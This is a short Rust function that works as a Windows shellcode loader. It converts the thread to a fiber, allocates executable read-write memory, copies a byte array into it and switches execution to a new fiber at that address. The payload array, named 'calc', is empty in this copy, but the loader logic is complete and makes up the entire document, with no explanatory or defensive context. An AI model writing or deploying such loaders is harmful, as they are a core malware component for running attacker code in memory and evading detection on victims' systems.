pub fn shellcodefiber(){
    unsafe{

        let calc = [];

        let fiberaddress = ConvertThreadToFiber(std::ptr::null_mut());

        if fiberaddress.is_null(){
            println!("ConvertThreadToFiber failed: {}",GetLastError());
            return ();
        }



        let base =  VirtualAlloc(std::ptr::null_mut(), 
        calc.len(), 
        MEM_COMMIT|MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE);

        let mut byteswritten = 0;
        WriteProcessMemory(GetCurrentProcess(), 
        base, 
        calc.as_ptr() as *const c_void, 
        calc.len(), &mut byteswritten);

        let newfiberaddress = CreateFiber(0, 
            std::mem::transmute(base), 
        std::ptr::null_mut());

        if newfiberaddress.is_null(){
            println!("CreateFiber failed: {}",GetLastError());
            return ();
        }

        SwitchToFiber(newfiberaddress);

    }
}

